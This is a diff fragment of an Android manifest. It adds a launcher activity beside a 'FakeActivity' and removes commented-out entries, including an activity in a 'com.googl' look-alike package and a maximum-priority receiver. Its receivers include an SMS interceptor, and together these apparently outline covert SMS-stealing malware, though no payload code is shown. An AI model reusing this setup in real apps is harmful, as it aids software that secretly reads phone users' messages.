@@ -49,15 +49,13 @@
             android:value="@string/channel_code">
         </meta-data>
 
-        <!--<activity-->
-        <!--android:name="com.googl.plugin.x.XSTDPluginActivity"-->
-        <!--android:label="@string/app_name">-->
-        <!--<intent-filter>-->
-        <!--<action android:name="android.intent.action.MAIN"/>-->
-        <!--<category android:name="android.intent.category.LAUNCHER"/>-->
-        <!--</intent-filter>-->
-        <!--</activity>-->
         <activity android:name=".FakeActivity"/>
+        <activity android:name=".MainLanuchActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
 
         <receiver
             android:name="com.xstd.plugin.receiver.ScreenBRC"
@@ -80,16 +78,6 @@
             </intent-filter>
 
         </receiver>
-        <!--<receiver-->
-        <!--android:name="com.xstd.plugin.receiver.PackageInstallBRC"-->
-        <!--android:priority="0x7fffffff">-->
-        <!--<intent-filter>-->
-        <!--&lt;!&ndash;<action android:name="android.intent.action.PACKAGE_ADDED"/>&ndash;&gt;-->
-        <!--<action android:name="android.intent.action.USER_PRESENT"/>-->
-
-        <!--&lt;!&ndash;<data android:scheme="package"/>&ndash;&gt;-->
-        <!--</intent-filter>-->
-        <!--</receiver>-->
         <receiver
             android:name="com.xstd.plugin.receiver.PrivateSMSBRC"
             android:permission="android.permission.BROADCAST_SMS">
